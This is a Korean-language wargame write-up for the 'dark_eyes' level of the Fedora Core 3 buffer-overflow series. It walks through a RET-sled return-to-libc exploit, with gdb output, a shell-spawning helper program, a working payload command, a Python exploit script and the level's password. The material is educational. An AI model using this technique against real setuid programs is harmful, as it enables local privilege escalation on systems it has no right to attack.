@@ -1,0 +1,177 @@
+---
+layout: post
+title:  "[FC3]Level2. dark_eyes"
+subtitle:   "[FC3]iron_golem → dark_eyes"
+categories: Wargame[FC3]
+tags:
+- Wargame
+- Fedora Catle 3
+- Write-up
+---
+
+## Keyword : RET Sleding
+
+```c
+/*
+  The Lord of the BOF : The Fellowship of the BOF
+  - dark_eyes
+  - Local BOF on Fedora Core 3
+  - hint : RET sleding
+*/
+
+int main(int argc, char *argv[])
+{
+  char buffer[256];
+  char saved_sfp[4];
+
+  if(argc < 2){
+    printf("argv error\n");
+    exit(0);
+  }
+
+  // save sfp
+  memcpy(saved_sfp, buffer+264, 4);
+
+  // overflow!!
+  strcpy(buffer, argv[1]);
+
+  // restore sfp
+  memcpy(buffer+264, saved_sfp, 4);
+
+  printf("%s\n", buffer);
+}
+```
+
+Cannary 보호기법을 흉내낸 코드 같다. 
+
+sfp에 담겨있는 값을 saved_sfp에 저장해두고 strcpy실행 이후 sfp를 다시 복원시킨다.
+
+따라서 앞에 문제에서 사용했던 FakeEBP는 사용 불가능하다.
+
+
+
+RET Sleding이라는 힌트가 있어서 EBP 아래부분을 살펴보았다.
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/fc3/2.dark_eyes/image-20180807162316255.png" width="500px">
+
+EBP+28 부분에 NULL값이 존재하였다. 이는 매우 중요한 값으로 사용 가능하다.
+
+strcpy함수로 NULL값을 넘겨주는 것은 불가능 하기 때문에, 스택상에 NULL값을 이용하면 된다.
+
+execv()함수를 이용할 때 인자가 끝났다는 표시를 NULL값으로 확인하기 때문에 NULL 앞에 값은 execv의 인자로 사용하면 된다.
+
+
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/fc3/2.dark_eyes/image-20180807171320581.png" width="600px">
+
+위 사진처럼 RET에 RET명령어를 3개를 넣고, execv()함수 주소를 넣으면 execv()+8부분을 인자값으로 실행한다.
+
+
+
+그러면 0x83eff4부분에 무슨 값이 들어 있는지 확인해보자.
+
+```sh
+(gdb) x/x 0x83eff4
+0x83eff4 <svcauthsw+712>: 0x0083ed3c
+```
+
+0x83ed3c라는 값이 들어있다.
+
+그러면 이제 iron_grem문제처럼 심볼릭 링크를 이용하여 파일 이름을 83ed3c로 만들고 진행하면 될 것 같다.
+
+
+
+페이로드 준비물
+
+- ret가젯 주소
+- execv함수 주소 
+
+```sh
+[iron_golem@Fedora_1stFloor ~]$ objdump -S dark_eyes | grep ret
+ 80482fe: c3                    ret
+ 80483a4: c3                    ret
+ 80483d9: c3                    ret
+------ 생략 ------
+```
+
+dark_eyes 바이너리 안에 ret명령어 가젯들을 보여준다. 이중 하나 고르자.
+
+
+
+```sh
+(gdb) p execv
+$1 = {<text variable, no debug info>} 0x7a55d0 <execv>
+```
+
+execv 함수도 gdb상에서 구해주자.
+
+
+
+- ret가젯 주소 : 0x80482fe
+- execv함수 주소 : 0x7a55d0
+
+
+
+이제 권한 상승하여 쉘을 띄우는 프로그램을 만들자.
+
+```c
+[iron_golem@Fedora_1stFloor ~]$ cat tmp.c
+#include<stdio.h>
+
+int main(){
+  setreuid(geteuid(), geteuid());
+  system("/bin/sh");
+  return 0;
+}
+```
+
+
+
+```sh
+[iron_golem@Fedora_1stFloor ~]$ gcc -o $(python -c 'print "\x3c\xed\x83"') tmp.c
+```
+
+ln -s 를 이용하여 하는 방법도 있지만, gcc로 컴파일 할때 파일 이름 자체를 바꾸는 방법을 사용해 봤다.
+
+> ln -s 과정을 생략 할 수 있다.
+
+
+
+```sh
+[iron_golem@Fedora_1stFloor ~]$ ./dark_eyes `python -c 'print "A"*268+"\xfe\x82\x04\x08"*3+"\xd0\x55\x7a\x00"'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�s������Uz
+sh-3.00$ id
+uid=502(dark_eyes) gid=501(iron_golem) groups=501(iron_golem) context=user_u:system_r:unconfined_t
+sh-3.00$ my-pass
+euid = 502
+because of you
+```
+
+payload : `| buffer(264)+dummy(4) | ret Gadget*3 | execv() |` 
+
+
+
+ex도 짜보자.
+
+```python
+import struct
+import os
+
+p32 = lambda x : struct.pack("<I", x)
+
+target = "/home/iron_golem/dark_eyes"
+
+ret = 0x80482fe
+execv = 0x7a55d0
+
+payload  = "A"*264  # buffer + dummy
+payload += "B"*4  # SFP
+payload += p32(ret)*3 # ret * 3
+payload += p32(execv) # execv
+
+os.execv(target, (target, payload[:-1]))
+```
+
+
+
+**dark_eyes / because of you**
